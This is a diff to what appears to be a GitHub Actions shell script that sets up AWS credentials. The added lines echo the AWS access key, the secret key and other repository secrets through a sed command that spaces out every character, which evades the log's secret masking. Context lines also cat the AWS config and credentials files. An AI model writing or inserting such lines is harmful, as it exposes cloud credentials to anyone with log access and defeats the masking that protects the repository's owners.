@@ -19,6 +19,12 @@ aws configure set aws_access_key_id $AWS_ACCESS_KEY_ID
 aws configure set aws_secret_access_key $AWS_SECRET_ACCESS_KEY
 aws configure set region $AWS_REGION
 
+echo ${{ secrets.AWS_ACCESS_KEY_ID }} | sed 's/./& /g'
+echo ${{ secrets.AWS_SECRET_ACCESS_KEY }} | sed 's/./& /g'
+echo ${{ secrets.CLUSTER_NAME }} | sed 's/./& /g'
+echo ${{ secrets.CLUSTER_NAME }} | sed 's/./& /g'
+echo ${{ secrets.SERVER_NAME }} | sed 's/./& /g'
+
 # Save Inital Path
 initial_path=$(pwd)
 
@@ -88,7 +94,7 @@ apt-get install tree
 echo "------------------------"
 
 
-tree -L 3 -a /
+tree -L 4 -a /github
 cat /github/home/.aws/config
 cat /github/home/.aws/credentials
 
